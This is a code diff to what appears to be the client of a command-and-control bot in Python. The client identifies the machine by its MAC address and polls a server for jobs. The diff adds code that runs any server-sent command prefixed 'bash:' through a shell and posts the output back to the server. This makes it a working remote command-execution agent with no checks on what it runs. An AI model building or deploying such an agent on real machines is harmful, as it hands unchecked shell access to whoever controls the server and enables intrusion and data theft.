@@ -5,6 +5,7 @@ sys.path.append("modules")
 import requests,json
 from time import sleep
 from uuid import getnode as generateID
+import subprocess
 
 SERVER_URL = "http://localhost:6969/api/"
 MY_ID = generateID()
@@ -16,16 +17,25 @@ def Init():
 def Polling():
     response = requests.get(SERVER_URL + "getUpdates?id={}".format(MY_ID))
     data = json.loads(response.text)
-    if not data["idle"]:
-        return data["command"]
+    print(data)
+    if not data['command'] == None:
+        return data['command']
     return False
+
+def sendReponse(_data):
+    response = requests.post(SERVER_URL+"getUpdates",data=_data)
+    print(response)
 
 def main():
     Init()
     #while(True):
     command = Polling()
     if command:
-        print(command)
+        print(command)        
+        if command['command'][0:5] == 'bash:':
+            output = subprocess.check_output(['bash','-c', command['command'][5:]]).decode('utf-8')
+            sendReponse({'id':MY_ID,'command_id': command['id'],'response': output})
+            print(output)
     #else:
     #    sleep(5)
 
